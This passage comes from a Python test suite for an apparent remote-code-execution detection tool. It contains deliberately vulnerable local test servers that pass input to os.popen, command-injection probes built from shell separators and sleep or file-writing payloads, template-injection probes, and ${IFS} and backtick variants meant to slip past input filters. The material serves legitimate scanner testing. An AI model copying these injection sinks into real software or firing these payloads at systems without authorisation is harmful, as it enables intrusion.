        raw = ReflectedMath(self.gen, {"sink_raw": True}).build_probes(rec, _random.Random(3))
        for probe in raw:
            self.assertFalse(probe.payload.lstrip().startswith(";"))
            # The expected sum is still absent from the payload, so only execution
            # can place it in the response — the invariant is untouched.
            self.assertNotIn(probe.expected, probe.payload)
        self.assertTrue(raw[0].payload.startswith("echo "))
        # The other shell-based methods drop the separator too.
        timing = ParametricTime(self.gen, {"sink_raw": True, "time_base": 2}).build_probes(
            rec, _random.Random(3))
        self.assertTrue(any(p.payload.startswith("sleep ") for p in timing))
        self.assertFalse(any(p.payload.lstrip().startswith(";") for p in timing))
        file_cfg = {"sink_raw": True, "webroot": "/var/www", "web_base_url": "http://t"}
        file_probe = FileBased(self.gen, file_cfg).build_probes(rec, _random.Random(3))[0]
        self.assertTrue(file_probe.payload.startswith("echo "))
        self.assertFalse(file_probe.payload.lstrip().startswith(";"))

    def test_delivery_error_is_error_not_negative(self):
        # status=None means the request never reached the target (delivery/TLS
        # failure). Reporting that as `negative` would read as "not vulnerable",
        # so every method must return `error` instead.
        import random as _random
        rec = make_record(environment="unix", context="raw")
        probe = self.method.build_probes(rec, _random.Random(5))[0]
        self.assertEqual(
            self.method.confirm(Observation(None, "<urlopen error ...>"), probe).status,
            "error")
        fb = FileBased(self.gen, {"webroot": "/var/www", "web_base_url": "http://t"})
        fprobe = fb.build_probes(rec, _random.Random(5))[0]
        self.assertEqual(
            fb.confirm(Observation(None, "err", followup_body=None), fprobe).status, "error")
        pt = ParametricTime(self.gen, {"time_base": 1})
        series = [(p, Observation(None, "err", elapsed=0.0))
                  for p in pt.build_probes(rec, _random.Random(5))]
        self.assertEqual(pt.confirm_series(series).status, "error")

    def test_insecure_is_opt_in(self):
        # Default keeps certificate verification (context None = urllib default);
        # --insecure disables it, like curl -k, only when the operator opts in.
        import ssl
        self.assertIsNone(self.gen._verify_ssl_context())
        self.gen.insecure = True
        ctx = self.gen._verify_ssl_context()
        self.assertEqual(ctx.verify_mode, ssl.CERT_NONE)
        self.assertFalse(ctx.check_hostname)

    def test_reflected_math_confirms_on_executing_target_only(self):
        # /vuln runs the injected string through a shell (real execution);
        # /reflect echoes it verbatim without executing. ReflectedMath must
        # confirm on the former and never on the latter.
        import http.server
        import os
        import socketserver
        import threading
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                parsed = up.urlparse(self.path)
                cmd = up.parse_qs(parsed.query).get("cmd", [""])[0]
                self.send_response(200)
                self.end_headers()
                if parsed.path == "/vuln":
                    pipe = os.popen("echo " + cmd + " 2>&1")  # command-injection sink
                    out = pipe.read()
                    pipe.close()
                else:  # /reflect: echo input, never execute
                    out = cmd
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            rec = make_record(environment="unix", context="raw")
            vuln = self.gen.run_detection(
                [rec], url=f"http://127.0.0.1:{port}/vuln?cmd=FUZZ", methods=["reflected"])
            confirmed = [r for r in vuln if r["verdict"] == "confirmed"]
            self.assertTrue(confirmed, "ReflectedMath must confirm against an executing sink")
            self.assertTrue(all(r["tier"] == "confirmed" and r["method"] == "reflected"
                                for r in confirmed))

            reflect = self.gen.run_detection(
                [rec], url=f"http://127.0.0.1:{port}/reflect?cmd=FUZZ", methods=["reflected"])
            self.assertFalse([r for r in reflect if r["verdict"] == "confirmed"],
                             "a target that only echoes input must never be confirmed")
        finally:
            server.shutdown()
            server.server_close()

    def test_confirms_echo_back_command_injection(self):
        # Regression for the most common real-world sink: a tool that echoes the
        # input back (e.g. "PING <input> ...") AND executes it. The reflected
        # literal `$((a+b))` must NOT downgrade the genuine RCE — the tag-wrapped
        # computed value is still unforgeable proof of execution.
        import http.server
        import os
        import socketserver
        import threading
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                ip = up.parse_qs(up.urlparse(self.path).query).get("ip", [""])[0]
                out = os.popen("ping -c 1 " + ip + " 2>&1").read()  # injection sink
                self.send_response(200)
                self.end_headers()
                # Echoes the raw input verbatim next to the executed output.
                self.wfile.write(f"PING {ip}\n{out}".encode(errors="replace"))

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            rec = make_record(environment="unix", context="raw")
            results = self.gen.run_detection(
                [rec], url=f"http://127.0.0.1:{port}/ping?ip=FUZZ", methods=["reflected"])
            confirmed = [r for r in results if r["verdict"] == "confirmed"]
            self.assertTrue(confirmed, "echo-back command injection must be confirmed, not downgraded")
        finally:
            server.shutdown()
            server.server_close()

    def test_methods_flag_rejects_unknown_method(self):
        # The CLI validates --methods before firing anything at the target.
        result = subprocess.run(
            [sys.executable, str(SCRIPT), "--verify-url", "http://127.0.0.1:9/x?q=FUZZ",
             "--methods", "bogus", "--acknowledge-consent"],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120)
        self.assertIn("Unknown --methods", result.stdout)


class RawRequestInputTestCase(unittest.TestCase):
    """Phase 2 — the `-r` raw HTTP request input layer. Each injection point is
    marked with FUZZ and routed into the existing verify/detect engine, which
    encodes it for the context it lands in."""

    def test_parse_raw_request_splits_line_headers_and_body(self):
        raw = "POST /api HTTP/1.1\r\nHost: t.example\r\nContent-Type: application/json\r\n\r\n{\"a\":1}"
        req = parse_raw_request(raw)
        self.assertEqual(req["method"], "POST")
        self.assertEqual(req["target"], "/api")
        self.assertEqual(req["host"], "t.example")
        self.assertEqual(req["body"], '{"a":1}')
        self.assertIn(["Content-Type", "application/json"], req["headers"])

    def test_trailing_newline_in_body_does_not_corrupt_last_param(self):
        # A request saved to a file (editor/heredoc) gains a trailing newline;
        # it must not attach to the last body parameter's value — that made
        # e.g. new2 = "test2\n" != new1 and broke form submissions.
        raw = ("POST /f HTTP/1.1\r\nHost: t.example\r\n"
               "Content-Type: application/x-www-form-urlencoded\r\n\r\nnew1=t&new2=t\n")
        self.assertEqual(parse_raw_request(raw)["body"], "new1=t&new2=t")
        _, _, data, _, _ = build_request_inputs(raw, param="new2")
        self.assertEqual(data, "new1=t&new2=FUZZ")
        # Every trailing newline is dropped; internal newlines are preserved.
        multi = "POST /a HTTP/1.1\r\nHost: t.example\r\n\r\nline1\nline2\n\n\n"
        self.assertEqual(parse_raw_request(multi)["body"], "line1\nline2")

    def test_query_param_marker_preserves_other_params(self):
        raw = "GET /lookup?host=example.com&x=1 HTTP/1.1\r\nHost: t.example\r\n\r\n"
        url, method, data, headers, injection = build_request_inputs(raw, param="host")
        self.assertEqual(url, "http://t.example/lookup?host=FUZZ&x=1")
        self.assertEqual(method, "GET")
        self.assertIsNone(data)
        self.assertIn("query param", injection)

    def test_json_field_marker(self):
        raw = ("POST /api HTTP/1.1\r\nHost: t.example\r\nContent-Type: application/json\r\n\r\n"
               '{"host": "a", "y": 2}')
        url, method, data, headers, injection = build_request_inputs(raw, param="host")
        self.assertEqual(method, "POST")
        self.assertIn('"host": "FUZZ"', data)
        self.assertIn('"y": 2', data)

    def test_form_body_and_cookie_and_header_markers(self):
        form = "POST /f HTTP/1.1\r\nHost: t.example\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\na=1&b=2"
        _, _, data, _, inj = build_request_inputs(form, param="b")
        self.assertEqual(data, "a=1&b=FUZZ")
        self.assertIn("body param", inj)

        cookie = "GET / HTTP/1.1\r\nHost: t.example\r\nCookie: sid=abc; role=user\r\n\r\n"
        _, _, _, headers, inj = build_request_inputs(cookie, param="role")
        self.assertIn("Cookie: sid=abc; role=FUZZ", headers)
        self.assertIn("cookie", inj)

        header = "GET / HTTP/1.1\r\nHost: t.example\r\nX-Api: key123\r\n\r\n"
        _, _, _, headers, inj = build_request_inputs(header, param="X-Api")
        self.assertIn("X-Api: FUZZ", headers)

    def test_inline_marker_and_scheme_inference(self):
        # `*` marks the point; Host on :443 infers https; Host/Content-Length dropped.
        raw = ("POST /api HTTP/1.1\r\nHost: t.example:443\r\nContent-Type: application/json\r\n"
               "Content-Length: 12\r\n\r\n{\"host\": \"*\"}")
        url, method, data, headers, injection = build_request_inputs(raw)
        self.assertTrue(url.startswith("https://t.example:443/api"))
        self.assertEqual(data, '{"host": "FUZZ"}')
        self.assertEqual(injection, "inline marker")
        self.assertFalse(any(h.lower().startswith(("host:", "content-length:")) for h in headers))

    def test_existing_fuzz_marker_is_respected(self):
        raw = "GET /q?a=FUZZ HTTP/1.1\r\nHost: t.example\r\n\r\n"
        url, _, _, _, injection = build_request_inputs(raw)
        self.assertEqual(url, "http://t.example/q?a=FUZZ")
        self.assertEqual(injection, "inline marker")

    def test_portless_host_stays_http_so_lab_targets_keep_working(self):
        # Lab ranges, CTF boxes and internal apps are routinely plain http on a
        # portless host. Defaulting those to https would leave the tool unable
        # to reach its most common targets out of the box, so the default holds
        # and the cleartext risk is surfaced by the CLI instead.
        raw = ("GET /q?a=FUZZ HTTP/1.1\r\nHost: dvwa.local\r\n"
               "Cookie: PHPSESSID=abc\r\n\r\n")
        url, _, _, _, _ = build_request_inputs(raw)
        self.assertTrue(url.startswith("http://"), url)

    def test_explicit_port_decides_the_scheme(self):
        for host, expected in (("t.example:443", "https"), ("t.example:80", "http"),
                               ("t.example:8080", "http"), ("10.0.0.5:8000", "http")):
            with self.subTest(host=host):
                raw = f"GET /q?a=FUZZ HTTP/1.1\r\nHost: {host}\r\n\r\n"
                url, _, _, _, _ = build_request_inputs(raw)
                self.assertTrue(url.startswith(expected + "://"), url)

    def test_request_scheme_override_wins_over_inference(self):
        raw = "GET /q?a=FUZZ HTTP/1.1\r\nHost: t.example\r\n\r\n"
        url, _, _, _, _ = build_request_inputs(raw, scheme="https")
        self.assertTrue(url.startswith("https://"), url)

    def test_missing_marker_and_missing_param_raise(self):
        with self.assertRaises(ValueError):
            build_request_inputs("GET /q?a=1 HTTP/1.1\r\nHost: t.example\r\n\r\n")
        with self.assertRaises(ValueError):
            build_request_inputs("GET /q?a=1 HTTP/1.1\r\nHost: t.example\r\n\r\n", param="nope")
        with self.assertRaises(ValueError):
            build_request_inputs("GET /q?a=* HTTP/1.1\r\n\r\n")  # no Host

    def test_raw_request_drives_detection_end_to_end(self):
        # A raw request marked with -p, routed through run_detection, confirms
        # against an executing sink — proving the -r layer feeds the engine.
        import http.server
        import os
        import socketserver
        import threading
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                cmd = up.parse_qs(up.urlparse(self.path).query).get("host", [""])[0]
                out = os.popen("echo " + cmd + " 2>&1").read()
                self.send_response(200)
                self.end_headers()
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            raw = (f"GET /vuln?host=example.com HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n\r\n")
            url, method, data, headers, injection = build_request_inputs(raw, param="host")
            self.assertEqual(injection, "query param 'host'")
            gen = RCEKit()
            rec = make_record(environment="unix", context="raw")
            results = gen.run_detection([rec], url=url, methods=["reflected"],
                                        method=method, data=data, headers=headers)
            self.assertTrue([r for r in results if r["verdict"] == "confirmed"],
                            "the -r request must reach the sink and confirm execution")
        finally:
            server.shutdown()
            server.server_close()


class FileBasedTestCase(unittest.TestCase):
    """Phase 3 — the FileBased (self-OOB) detection method. Confirmation requires
    the target to WRITE a random token to a web-reachable file and then serve it
    back; a target that does not execute never produces the file, so it stays
    unconfirmed. State-changing, so every finding carries a cleanup command."""

    def setUp(self):
        self.gen = RCEKit()
        self.config = {"webroot": "/var/www/html", "web_base_url": "https://t.example"}

    def test_not_applicable_without_config(self):
        rec = make_record(environment="unix", context="raw")
        self.assertFalse(FileBased(self.gen).applicable(rec))
        self.assertTrue(FileBased(self.gen, self.config).applicable(rec))

    def test_build_probe_writes_token_and_carries_followup(self):
        import random as _random
        method = FileBased(self.gen, self.config)
        probe = method.build_probes(make_record(environment="unix", context="raw"),
                                    _random.Random(3))[0]
        self.assertIn("echo", probe.payload)
        self.assertIn("/var/www/html/", probe.payload)
        self.assertIn(probe.expected, probe.payload)  # the token is what gets written
        self.assertTrue(probe.followup["url"].startswith("https://t.example/"))
        self.assertIn("rm -f", probe.followup["cleanup"])

    def test_confirm_requires_the_token_in_the_fetched_file(self):
        method = FileBased(self.gen, self.config)
        probe = Probe(payload="; echo TOK123 > /var/www/html/x.txt", expected="TOK123",
                      followup={"url": "https://t.example/x.txt", "cleanup": "rm -f x"})
        # Fetched file contains the token -> confirmed.
        self.assertEqual(
            method.confirm(Observation(200, "ok", followup_body="TOK123\n"), probe).status,
            "confirmed")
        # File served but without the token (e.g. 404 body) -> negative.
        self.assertEqual(
            method.confirm(Observation(200, "ok", followup_body="not found"), probe).status,
            "negative")
        # Fetch failed entirely -> negative, never confirmed.
        self.assertEqual(
            method.confirm(Observation(200, "ok", followup_body=None), probe).status,
            "negative")
        # Token also present without the payload -> not attributable to execution.
        self.assertEqual(
            method.confirm(Observation(200, "ok", control_body="TOK123",
                                       followup_body="TOK123"), probe).status,
            "inconclusive")

    def test_file_based_end_to_end_writes_and_confirms(self):
        # /vuln executes the injected command (which writes the token file); any
        # other path serves files from the web root. A non-executing sink never
        # creates the file, so it stays unconfirmed.
        import http.server
        import os
        import pathlib
        import socketserver
        import tempfile
        import threading
        import urllib.parse as up

        webroot = tempfile.mkdtemp()

        def make_handler(execute):
            class Handler(http.server.BaseHTTPRequestHandler):
                def log_message(self, *a):
                    pass

                def do_GET(self):
                    parsed = up.urlparse(self.path)
                    if parsed.path == "/vuln":
                        cmd = up.parse_qs(parsed.query).get("host", [""])[0]
                        if execute:
                            os.popen("echo " + cmd + " 2>&1").read()
                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(b"ok")
                        return
                    served = pathlib.Path(webroot) / parsed.path.lstrip("/")
                    if served.is_file():
                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(served.read_bytes())
                    else:
                        self.send_response(404)
                        self.end_headers()
                        self.wfile.write(b"not found")
            return Handler

        def run(execute):
            server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), make_handler(execute))
            port = server.server_address[1]
            threading.Thread(target=server.serve_forever, daemon=True).start()
            try:
                rec = make_record(environment="unix", context="raw")
                return self.gen.run_detection(
                    [rec], url=f"http://127.0.0.1:{port}/vuln?host=FUZZ", methods=["file"],
                    config={"webroot": webroot, "web_base_url": f"http://127.0.0.1:{port}"})
            finally:
                server.shutdown()
                server.server_close()

        confirmed = [r for r in run(execute=True) if r["verdict"] == "confirmed"]
        self.assertTrue(confirmed, "an executing+serving sink must confirm file-based RCE")
        self.assertTrue(all(r.get("cleanup") for r in confirmed), "each finding needs a cleanup command")
        self.assertTrue(os.listdir(webroot), "the token file must actually be written")

        self.assertFalse([r for r in run(execute=False) if r["verdict"] == "confirmed"],
                         "a non-executing sink must never be confirmed")

    def test_methods_flag_file_requires_webroot(self):
        result = subprocess.run(
            [sys.executable, str(SCRIPT), "--verify-url", "http://127.0.0.1:9/x?q=FUZZ",
             "--methods", "file", "--acknowledge-consent"],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120)
        self.assertIn("--webroot", result.stdout)


class ParametricTimeTestCase(unittest.TestCase):
    """Phase 4 — hardened blind timing. A controlled 0/N/2N delay series must
    produce a linear response-time increase; jitter cannot fake it. Timing has
    no computed value, so its ceiling is `needs-review` — it never confirms on
    its own (I2/I3)."""

    def setUp(self):
        self.gen = RCEKit()
        self.method = ParametricTime(self.gen, {"time_base": 2.0, "time_repeats": 2})

    def _series(self, mapping):
        """A regression-phase series. Only ``regress`` probes are judged — the
        screen round exists to pick a separator, not to decide anything — and
        the samples are interleaved rather than grouped by delay so the request
        index does not stand in for the injected delay."""
        samples = [(delay, elapsed) for delay, elapseds in mapping.items()
                   for elapsed in elapseds]
        samples.sort(key=lambda pair: (pair[1] * 7919) % 13)
        return [(Probe(payload="x", expected="", delay_s=delay, phase="regress"),
                 Observation(status=200, body="", elapsed=elapsed))
                for delay, elapsed in samples]

    def test_tier_is_needs_review_and_method_is_aggregate(self):
        self.assertEqual(self.method.tier, "needs-review")
        self.assertTrue(self.method.aggregate)

    def test_screen_probes_cover_zero_and_n_per_separator(self):
        # Round one only screens: one 0s and one Ns probe per candidate
        # separator, so the expensive regression is never run through a
        # break-out that did not reach a shell.
        import random as _random
        probes = self.method.build_probes(make_record(environment="unix", context="raw"),
                                          _random.Random(1))
        self.assertTrue(all(p.phase == "screen" for p in probes))
        self.assertEqual(sorted({p.delay_s for p in probes}), [0.0, 2.0])
        self.assertTrue(all("sleep" in p.payload for p in probes))

    def test_regression_probes_cover_zero_n_and_two_n(self):
        import random as _random
        record = make_record(environment="unix", context="raw")
        screen = self.method.build_probes(record, _random.Random(1))
        # A separator that delayed by the injected amount unlocks round two.
        series = [(p, Observation(status=200, body="", elapsed=(p.delay_s or 0.0) + 0.1))
                  for p in screen]
        regression = self.method.next_probes(series)
        self.assertTrue(regression)
        self.assertTrue(all(p.phase == "regress" for p in regression))
        self.assertEqual(sorted({p.delay_s for p in regression}), [0.0, 2.0, 4.0])
        # ...all through one separator: a regression blends its probes into a
        # single measurement, so mixing break-outs would destroy the signal.
        self.assertEqual(len({p.separator for p in regression}), 1)

    def test_no_separator_delays_means_no_regression_is_run(self):
        # The screen runs in waves, so "nothing broke out" is only a conclusion
        # once every separator has been tried -- a sink that filters ';' and '|'
        # is exactly the case the sweep exists for.
        import random as _random
        record = make_record(environment="unix", context="raw")
        series, batch = [], self.method.build_probes(record, _random.Random(1))
        waves = 0
        while batch:
            waves += 1
            series += [(p, Observation(status=200, body="", elapsed=0.1)) for p in batch]
            batch = self.method.next_probes(series)
        self.assertGreater(waves, 1, "the held-back separators must still be screened")
        self.assertEqual({p.separator for p, _ in series},
                         {"; ", "| ", "|| ", "&& ", "\n"})
        self.assertFalse([p for p, _ in series if p.phase == "regress"])
        verdict = self.method.confirm_series(series)
        self.assertEqual(verdict.status, "negative")
        self.assertIn("no command separator produced a delay", verdict.evidence)

    def test_a_first_wave_hit_skips_the_rest_of_the_screen(self):
        # Each delayed screen probe costs a real sleep, so the separators held
        # back are never sent once one has already broken out.
        import random as _random
        record = make_record(environment="unix", context="raw")
        screen = self.method.build_probes(record, _random.Random(1))
        series = [(p, Observation(status=200, body="",
                                  elapsed=(p.delay_s or 0.0) + 0.05)) for p in screen]
        nxt = self.method.next_probes(series)
        self.assertTrue(nxt)
        self.assertTrue(all(p.phase == "regress" for p in nxt),
                        "a working separator must go straight to the regression")

    def test_confirm_series_linear_response_is_needs_review(self):
        verdict = self.method.confirm_series(
            self._series({0: [0.10, 0.12], 2.0: [2.11, 2.09], 4.0: [4.12, 4.08]}))
        self.assertEqual(verdict.status, "needs-review")

    def test_latency_drift_is_not_mistaken_for_a_sleep(self):
        # A target that simply gets slower during the run -- progressive load, a
        # rate limiter backing off -- used to produce a textbook-perfect linear
        # fit while being entirely un-injectable, because the probes were fired
        # in ascending delay order and the delay was collinear with the request
        # index. Here every response time comes from the request order alone.
        series = []
        for i, delay in enumerate([2.0, 0.0, 4.0, 4.0, 0.0, 2.0, 0.0, 2.0, 4.0]):
            series.append((Probe(payload="x", expected="", delay_s=delay, phase="regress"),
                           Observation(status=200, body="", elapsed=1.0 * (i + 1))))
        verdict = self.method.confirm_series(series)
        self.assertEqual(verdict.status, "negative")
        self.assertIn("drift", verdict.evidence)

    def test_confirm_series_rejects_flat_jitter_and_nonmonotonic(self):
        flat = self.method.confirm_series(
            self._series({0: [0.10, 0.12], 2.0: [0.11, 0.13], 4.0: [0.10, 0.12]}))
        self.assertEqual(flat.status, "negative")
        jitter = self.method.confirm_series(
            self._series({0: [0.10, 0.12], 2.0: [3.9, 0.2], 4.0: [0.3, 0.25]}))
        self.assertEqual(jitter.status, "negative")
        nonmono = self.method.confirm_series(
            self._series({0: [0.1, 0.1], 2.0: [4.1, 4.0], 4.0: [2.1, 2.0]}))
        self.assertEqual(nonmono.status, "negative")

    def test_end_to_end_sleeping_sink_is_needs_review_never_confirmed(self):
        # The sink sleeps for the injected `sleep N`; a linear response must be
        # reported needs-review, never confirmed.
        import http.server
        import re as _re
        import socketserver
        import threading
        import time as _time
        import urllib.parse as up

        def make_handler(vulnerable):
            class Handler(http.server.BaseHTTPRequestHandler):
                def log_message(self, *a):
                    pass

                def do_GET(self):
                    cmd = up.parse_qs(up.urlparse(self.path).query).get("host", [""])[0]
                    match = _re.search(r"sleep ([0-9.]+)", cmd)
                    if vulnerable and match:
                        _time.sleep(float(match.group(1)))
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b"ok")
            return Handler

        def run(vulnerable):
            server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), make_handler(vulnerable))
            port = server.server_address[1]
            threading.Thread(target=server.serve_forever, daemon=True).start()
            try:
                rec = make_record(environment="unix", context="raw", expected_channel="timing")
                return self.gen.run_detection(
                    [rec], url=f"http://127.0.0.1:{port}/x?host=FUZZ", methods=["time"],
                    config={"time_base": 0.6, "time_repeats": 2})
            finally:
                server.shutdown()
                server.server_close()

        vuln = run(vulnerable=True)
        self.assertTrue(vuln)
        self.assertEqual(vuln[0]["verdict"], "needs-review")
        self.assertEqual(vuln[0]["tier"], "needs-review")
        self.assertFalse([r for r in vuln if r["verdict"] == "confirmed"],
                         "timing must never self-confirm")

        flat = run(vulnerable=False)
        self.assertEqual(flat[0]["verdict"], "negative")


class EvalExprTestCase(unittest.TestCase):
    """Phase 5 — code/expression injection (SSTI, SpEL, OGNL, Groovy, raw eval).
    Inject a*b on random operands in each common template syntax and confirm the
    product appears while the literal a*b does not — the computed-value invariant
    for an expression evaluator."""

    def setUp(self):
        self.gen = RCEKit()
        self.method = EvalExpr(self.gen)

    def test_build_probes_cover_common_expression_syntaxes(self):
        import random as _random
        probes = self.method.build_probes(make_record(environment="python", context="raw", sink="ssti"),
                                          _random.Random(5))
        joined = " ".join(p.payload for p in probes)
        for delim in ("${", "{{", "#{", "%{", "<%=", "@("):
            self.assertIn(delim, joined)
        for probe in probes:
            # expected is the product; forbidden is the literal expression, which
            # is present in the payload but must be absent from a confirmed body.
            self.assertNotIn(probe.expected, probe.payload)
            self.assertIn(probe.forbidden, probe.payload)

    def test_confirm_evaluation_vs_reflection_vs_boundary(self):
        import random as _random
        probe = self.method.build_probes(make_record(environment="python", context="raw"),
                                         _random.Random(5))[1]
        # Evaluated: product present, literal absent.
        self.assertEqual(
            self.method.confirm(Observation(200, f"= {probe.expected} =", control_body="x"), probe).status,
            "confirmed")
        # Reflected: literal echoed, product never produced.
        self.assertEqual(
            self.method.confirm(Observation(200, f"= {probe.forbidden} =", control_body="x"), probe).status,
            "negative")
        # Product embedded in a longer digit run must not match (digit boundary).
        self.assertEqual(
            self.method.confirm(Observation(200, f"id={probe.expected}00", control_body="x"), probe).status,
            "negative")
        # Present without the payload too -> inconclusive.
        self.assertEqual(
            self.method.confirm(Observation(200, probe.expected, control_body=probe.expected), probe).status,
            "inconclusive")

    def test_eval_end_to_end_against_evaluating_sink(self):
        # /ssti evaluates a bare `a*b` (or one wrapped in ${...}/{{...}}/...);
        # /reflect echoes input verbatim. EvalExpr must confirm on the former only.
        import http.server
        import re as _re
        import socketserver
        import threading
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                parsed = up.urlparse(self.path)
                raw = up.parse_qs(parsed.query).get("q", [""])[0]
                self.send_response(200)
                self.end_headers()
                if parsed.path == "/ssti":
                    # Simulate an expression evaluator: strip common delimiters,
                    # then evaluate a pure `int*int` expression.
                    expr = _re.sub(r"^[\$#%@]?\(?\{*=?\s*|\s*\}*\)?%?>?\s*$", "", raw)
                    expr = expr.strip("${}#%@()<>= ")
                    match = _re.fullmatch(r"(\d+)\*(\d+)", expr)
                    out = str(int(match.group(1)) * int(match.group(2))) if match else raw
                else:
                    out = raw
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            rec = make_record(environment="python", context="raw", sink="ssti")
            evaluated = self.gen.run_detection(
                [rec], url=f"http://127.0.0.1:{port}/ssti?q=FUZZ", methods=["eval"])
            self.assertTrue([r for r in evaluated if r["verdict"] == "confirmed"],
                            "EvalExpr must confirm against an expression evaluator")
            reflected = self.gen.run_detection(
                [rec], url=f"http://127.0.0.1:{port}/reflect?q=FUZZ", methods=["eval"])
            self.assertFalse([r for r in reflected if r["verdict"] == "confirmed"],
                             "a target that only echoes input must never be confirmed")
        finally:
            server.shutdown()
            server.server_close()


class EvadeTestCase(unittest.TestCase):
    """Phase 6 — `--evade low`. Default is clean canonical payloads; `low` applies
    a single low-touch transform (${IFS} for spaces) to Unix shell command probes
    only, and never to the file-write redirect (which ${IFS} would break)."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def test_default_is_canonical_no_obfuscation(self):
        import random as _random
        probe = ReflectedMath(self.gen).build_probes(self.rec, _random.Random(1))[0]
        self.assertNotIn("${IFS}", probe.payload)
        self.assertIn(" ", probe.payload)

    def test_evade_low_substitutes_ifs_for_reflected_and_time(self):
        import random as _random
        reflected = ReflectedMath(self.gen, {"evade": "low"}).build_probes(self.rec, _random.Random(1))[0]
        self.assertIn("${IFS}", reflected.payload)
        self.assertNotIn(" ", reflected.payload)
        timing = ParametricTime(self.gen, {"evade": "low", "time_base": 2}).build_probes(
            self.rec, _random.Random(1))[-1]
        self.assertIn("${IFS}", timing.payload)
        self.assertNotIn(" ", timing.payload)

    def test_file_write_stays_canonical_under_evade(self):
        import random as _random
        config = {"evade": "low", "webroot": "/var/www", "web_base_url": "http://t"}
        probe = FileBased(self.gen, config).build_probes(self.rec, _random.Random(1))[0]
        # The `>` redirect must not be broken by ${IFS}.
        self.assertNotIn("${IFS}", probe.payload)
        self.assertIn(" > ", probe.payload)

    def test_evade_low_still_confirms_against_shell_sink(self):
        import http.server
        import os
        import socketserver
        import threading
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                cmd = up.parse_qs(up.urlparse(self.path).query).get("host", [""])[0]
                out = os.popen("echo " + cmd + " 2>&1").read()
                self.send_response(200)
                self.end_headers()
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            results = self.gen.run_detection(
                [self.rec], url=f"http://127.0.0.1:{port}/vuln?host=FUZZ", methods=["reflected"],
                config={"evade": "low"})
            confirmed = [r for r in results if r["verdict"] == "confirmed"]
            self.assertTrue(confirmed, "the ${IFS} variant must still execute and confirm")
            self.assertIn("${IFS}", confirmed[0]["payload"])
        finally:
            server.shutdown()
            server.server_close()


class DetectionRobustnessTestCase(unittest.TestCase):
    """Supplementary regression tests distilled from validating RCEKit against a
    local VulnHub-class range: guarantees not otherwise locked in — encoding
    resilience, probe redundancy, and (most importantly) false-positive
    resistance, the tool's core promise."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def test_confirms_through_base64_encoded_output(self):
        # A sink whose command output is base64-encoded must still confirm:
        # _encoded_search peels the wrapper and finds the computed value.
        import base64
        import os

        def route(method, path, params, headers, body):
            pipe = os.popen("echo " + params.get("host", "") + " 2>&1")
            out = pipe.read()
            pipe.close()
            return 200, base64.b64encode(out.encode()).decode()

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/b64?host=FUZZ", methods=["reflected"])
            self.assertTrue([r for r in results if r["verdict"] == "confirmed"],
                            "base64-encoded command output must still confirm")

    def test_backtick_variant_survives_a_dollar_paren_filter(self):
        # A sink that strips "$(" defeats the $((..)) probe but not the backtick
        # `expr` variant — probe redundancy keeps the detection alive.
        import os

        def route(method, path, params, headers, body):
            ip = params.get("ip", "").replace("$(", "")
            pipe = os.popen("ping -c 1 " + ip + " 2>&1")
            out = pipe.read()
            pipe.close()
            return 200, "PING " + ip + "\n" + out

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/filter?ip=FUZZ", methods=["reflected"])
            self.assertTrue([r for r in results if r["verdict"] == "confirmed"],
                            "the backtick variant must survive a $( filter")

    def test_eval_is_not_fooled_by_random_numbers_in_the_page(self):
        # A page full of large random numbers (session ids, timestamps) must not
        # trick EvalExpr: the product is boundary-fenced and differenced against
        # the payload-free control.
        import random as _random

        def route(method, path, params, headers, body):
            return 200, f"session={_random.randint(10**7, 10**8)} ts={_random.randint(10**7, 10**8)}"

        with local_target(route) as base:
            results = self.gen.run_detection(
                [make_record(environment="python", context="raw")],
                url=f"{base}/x?q=FUZZ", methods=["eval"])
            self.assertFalse([r for r in results if r["verdict"] == "confirmed"],
                             "random numbers on the page must not be a false positive")

    def test_timing_is_not_fooled_by_random_latency(self):
        # A target with random per-request latency (but no injection) must not
        # confirm: the regression needs the response time to track the injected
        # delay linearly, which jitter cannot.
        import random as _random
        import time as _time

        def route(method, path, params, headers, body):
            _time.sleep(_random.uniform(0, 0.2))
            return 200, "ok"

        with local_target(route) as base:
